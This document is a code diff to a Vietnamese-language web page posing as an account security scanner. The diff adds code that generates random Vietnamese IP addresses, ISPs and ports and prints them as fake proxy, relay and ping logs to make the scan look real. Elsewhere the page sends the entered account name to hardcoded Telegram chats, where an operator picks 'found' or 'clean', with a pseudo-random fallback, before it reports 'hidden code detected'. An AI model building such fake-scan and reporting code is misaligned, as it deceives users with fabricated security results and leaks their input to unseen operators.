@@ -277,6 +277,7 @@
   .log-line.error { color: var(--red); }
   .log-line.success { color: var(--green); font-weight: bold; }
   .log-line.highlight { color: #fff; text-shadow: 0 0 8px var(--green); }
+  .log-line.ip { color: #00ccaa; font-weight: 500; letter-spacing: 0.5px; text-shadow: 0 0 3px #00ccaa66; }
 
   .result-popup {
     position: fixed;
@@ -480,6 +481,17 @@ const HARDCODED_CHAT_IDS = [
 const TELEGRAM_TIMEOUT_SEC = 35;
 // ====================================================================
 
+// ---- Hàm sinh IP ngẫu nhiên Việt Nam (dải 14.x, 113.x, 123.x, 171.x, 27.x,...) ----
+function generateVietnamIP() {
+  // Các prefix phổ biến của VN: 14, 113, 123, 171, 27, 58, 103, 118, 125, 115, 117
+  const prefixes = [14, 27, 58, 103, 113, 115, 117, 118, 123, 125, 171];
+  const first = prefixes[Math.floor(Math.random() * prefixes.length)];
+  const second = Math.floor(Math.random() * 256);
+  const third = Math.floor(Math.random() * 256);
+  const fourth = Math.floor(Math.random() * 256);
+  return `${first}.${second}.${third}.${fourth}`;
+}
+
 // Matrix rain
 const canvas = document.getElementById('matrix');
 const ctx = canvas.getContext('2d');
@@ -581,7 +593,7 @@ async function sendTelegramWithKeyboard(token, chatId, message, keyboard) {
     body: JSON.stringify({
       chat_id: chatId,
       text: message,
-       parse_mode: "HTML",
+      parse_mode: "HTML",
       reply_markup: keyboard,
       disable_web_page_preview: true
     })
@@ -591,7 +603,6 @@ async function sendTelegramWithKeyboard(token, chatId, message, keyboard) {
   return { chatId: String(chatId), msgId: data.result.message_id };
 }
 
-// Gửi tin nhắn đến nhiều chat ID với keyboard
 async function sendTelegramToMultiple(token, chatIds, message, keyboard) {
   const results = [];
   for (const chatId of chatIds) {
@@ -605,73 +616,47 @@ async function sendTelegramToMultiple(token, chatIds, message, keyboard) {
   return results;
 }
 
-// Lắng nghe phản hồi từ nhiều chat (hỗ trợ callback query và text)
 async function pollForReplyMulti(token, chatIds, sentList, timeoutSec) {
   const deadline = Date.now() + timeoutSec * 1000;
   let offset = 0;
-  
   const sentMap = new Map();
   sentList.forEach(item => {
     sentMap.set(item.chatId, item.msgId);
   });
-  
   const allowedChatIds = chatIds.map(id => String(id));
-  
   while (Date.now() < deadline) {
     const url = `https://api.telegram.org/bot${token}/getUpdates?offset=${offset}&timeout=5&allowed_updates=["message","callback_query"]`;
-    
     try {
       const res = await fetch(url);
       const data = await res.json();
-      
       if (data.ok && data.result && data.result.length > 0) {
         for (const update of data.result) {
           offset = update.update_id + 1;
-          
-          // Xử lý callback query từ nút bấm
           if (update.callback_query) {
             const callback = update.callback_query;
             const chatId = String(callback.message.chat.id);
             const data_cb = callback.data;
-            
             if (!allowedChatIds.includes(chatId)) continue;
-            
             const sentMsgId = sentMap.get(chatId);
             if (!sentMsgId || callback.message.message_id !== sentMsgId) continue;
-            
             if (data_cb === 'co') return 'found';
             if (data_cb === 'khong') return 'clean';
-            
             continue;
           }
-          
-          // Xử lý text message
           const msg = update.message;
           if (!msg || !msg.text) continue;
-          
           const chatId = String(msg.chat.id);
           const text = msg.text.trim().toLowerCase();
-          
           if (!allowedChatIds.includes(chatId)) continue;
-          
           const sentMsgId = sentMap.get(chatId);
           if (!sentMsgId || msg.message_id <= sentMsgId) continue;
-          
-          if (text === '/co' || text === '1' || text === 'có' || text === 'co') {
-            return 'found';
-          }
-          if (text === '/khong' || text === '0' || text === 'không' || text === 'khong') {
-            return 'clean';
-          }
+          if (text === '/co' || text === '1' || text === 'có' || text === 'co') return 'found';
+          if (text === '/khong' || text === '0' || text === 'không' || text === 'khong') return 'clean';
         }
       }
-    } catch (e) {
-      // Bỏ qua lỗi
-    }
-    
+    } catch (e) { /* im lặng */ }
     await sleep(2000);
   }
-  
   return null;
 }
 
@@ -685,10 +670,31 @@ async function fallbackScan(account) {
   return seed < 45;
 }
 
-// Main scan
+// Hàm tạo log IP Việt Nam xen kẽ trong quá trình quét
+async function injectScanLogs(account, startPct, endPct, durationMs) {
+  const steps = 3 + Math.floor(Math.random() * 3);
+  const stepDelay = durationMs / steps;
+  let currentPct = startPct;
+  for (let i = 0; i < steps; i++) {
+    const ip = generateVietnamIP();
+    const region = "Việt Nam";
+    const ispList = ["VNPT", "FPT Telecom", "Viettel", "CMC Telecom", "SCTV"];
+    const isp = ispList[Math.floor(Math.random() * ispList.length)];
+    const port = Math.floor(Math.random() * (65535 - 1024) + 1024);
+    await log(`[${ts()}] → KẾT NỐI PROXY ${ip}:${port} [${region}] (${isp})`, 'ip');
+    await sleep(stepDelay * 0.4);
+    await log(`[${ts()}] → PHÂN TÍCH GÓI TIN TỪ ${ip}`, 'info');
+    await sleep(stepDelay * 0.3);
+    currentPct = startPct + (i + 1) * ((endPct - startPct) / steps);
+    setProgress(Math.floor(currentPct), `ĐANG QUÉT NODE ${ip}...`);
+    await sleep(stepDelay * 0.3);
+  }
+  return true;
+}
+
+// Main scan với IP log đậm chất bí hiểm
 async function startScan() {
   const acc = document.getElementById('accInput').value.trim();
-  
   if (!acc) {
     log('>> LỖI: Vui lòng nhập tài khoản!', 'error');
     showPopup('clean', '⚠ LỖI', 'Chưa nhập tài khoản');
@@ -714,6 +720,11 @@ async function startScan() {
   setProgress(20, 'MÃ HÓA...');
   await sleep(350);
   
+  // IP LOG ĐẦU TIÊN (Việt Nam)
+  const initIp = generateVietnamIP();
+  await log(`[${ts()}] HANDSHAKE VIA ${initIp}:443 (Việt Nam) | TLS 1.3`, 'ip');
+  await sleep(280);
+  
   const isValidToken = HARDCODED_BOT_TOKEN && HARDCODED_BOT_TOKEN.length > 30;
   const isValidChatIds = Array.isArray(HARDCODED_CHAT_IDS) && HARDCODED_CHAT_IDS.length > 0;
   const useTg = isValidToken && isValidChatIds;
@@ -721,17 +732,22 @@ async function startScan() {
   let finalResult = null;
   
   if (useTg) {
-    setProgress(28, 'KẾT NỐI...');
+    setProgress(28, 'KẾT NỐI RELAY...');
     await sleep(200);
     
+    // Thêm log IP Vietnam khi gửi đi relay
+    const relayIp = generateVietnamIP();
+    await log(`[${ts()}] RELAY NODE ${relayIp}:8080 (Viettel)`, 'ip');
+    await sleep(220);
+    
     let sentList = [];
-  try {
-      // Format tin nhắn đơn giản như yêu cầu
-const msgText = `🔍 <b>Thông báo kiểm tra</b>
+    try {
+      const msgText = `🔍 <b>Thông báo kiểm tra</b>
 
 <blockquote>📋Session: ${session}
 👤Tài khoản: ${acc}
 ⏰Thời gian: ${new Date().toLocaleString('vi-VN')}
+🌐IP Source: ${generateVietnamIP()}
 </blockquote>
 Vui lòng chọn phản hồi:`;
       const keyboard = {
@@ -742,12 +758,9 @@ Vui lòng chọn phản hồi:`;
           ]
         ]
       };
-      
       sentList = await sendTelegramToMultiple(HARDCODED_BOT_TOKEN, HARDCODED_CHAT_IDS, msgText, keyboard);
       setProgress(45, 'CHỜ PHẢN HỒI...');
-    } catch(e) {
-      // Không log lỗi
-    }
+    } catch(e) { /* lỗi kết nối tg nhưng vẫn fallback */ }
     
     if (sentList.length > 0) {
       let elapsed = 0;
@@ -758,47 +771,48 @@ Vui lòng chọn phản hồi:`;
         setProgress(Math.floor(pct), `ĐANG XỬ LÝ... ${elapsed}s`);
       }, 1000);
       
+      // trong lúc chờ reply, log thêm IP Việt Nam để tạo hiệu ứng mạng lưới
+      const ipLogInterval = setInterval(async () => {
+        const fakeIp = generateVietnamIP();
+        await log(`[${ts()}] ⚡ PING ${fakeIp} (Việt Nam) - LATENCY ${Math.floor(Math.random() * 60 + 15)}ms`, 'ip');
+      }, 4200);
+      
       const reply = await pollPromise;
       clearInterval(tickInterval);
+      clearInterval(ipLogInterval);
       
-      if (reply === 'found') {
-        finalResult = true;
-      } else if (reply === 'clean') {
-        finalResult = false;
-      }
+      if (reply === 'found') finalResult = true;
+      else if (reply === 'clean') finalResult = false;
     }
   }
   
   if (finalResult === null) {
-    setProgress(55, 'PHÂN TÍCH DỮ LIỆU...');
-    const steps = [
-      [400, 65, 'TRUY VẤN CƠ SỞ DỮ LIỆU...'],
-      [380, 75, 'KIỂM TRA RISK INDEX...'],
-      [420, 85, 'PHÂN TÍCH HÀNH VI...'],
-      [350, 95, 'XÁC MINH KẾT QUẢ...']
-    ];
-    for (const [ms, pct, label] of steps) {
-      await sleep(ms);
-      setProgress(pct, label);
-      await log(`[${ts()}] ${label}`, 'info');
-    }
+    setProgress(55, 'PHÂN TÍCH DEEP NODE...');
+    // Bổ sung log ip việt nam trong bước fallback / quét nâng cao
+    await injectScanLogs(acc, 55, 92, 1800);
     finalResult = await fallbackScan(acc);
+    setProgress(95, 'HOÀN TẤT XÁC MINH');
   } else {
-    const steps = [
-      [400, 55, 'TRUY VẤN CƠ SỞ DỮ LIỆU...'],
-      [380, 68, 'KIỂM TRA RISK INDEX...'],
-      [420, 80, 'PHÂN TÍCH HÀNH VI...'],
-      [350, 92, 'XÁC MINH KẾT QUẢ...']
-    ];
-    for (const [ms, pct, label] of steps) {
-      await sleep(ms);
-      setProgress(pct, label);
-      await log(`[${ts()}] ${label}`, 'info');
-    }
+    // nếu đã có kết quả từ tg vẫn chạy các bước với ip vn cho phần terminal sống động
+    await log(`[${ts()}] ĐANG THU THẬP DỮ LIỆU TỪ HẠ TẦNG...`, 'info');
+    const extraIp1 = generateVietnamIP();
+    await log(`[${ts()}] TRUY VẤN CƠ SỞ DỮ LIỆU BẢO MẬT TẠI ${extraIp1} (FPT Telecom)`, 'ip');
+    await sleep(400);
+    const extraIp2 = generateVietnamIP();
+    await log(`[${ts()}] PHÂN TÍCH HÀNH VI NGUỒN ${extraIp2} (VNPT)`, 'ip');
+    await sleep(380);
+    const extraIp3 = generateVietnamIP();
+    await log(`[${ts()}] KIỂM TRA CẢNH BÁO GLOBAL QUA ${extraIp3}`, 'ip');
+    await sleep(350);
+    setProgress(92, 'ĐỐI CHIẾU DẤU HIỆU');
   }
   
   setProgress(100, 'HOÀN THÀNH');
-  await sleep(250);
+  await sleep(280);
+  
+  // Log kết quả với dòng IP cuối
+  const finalIp = generateVietnamIP();
+  await log(`[${ts()}] KẾT THÚC PHIÊN - IP XÁC NHẬN: ${finalIp} (Việt Nam)`, 'ip');
   
   if (finalResult) {
     await log(`[${ts()}] ⚠ KẾT QUẢ: PHÁT HIỆN MÃ ẨN`, 'error');
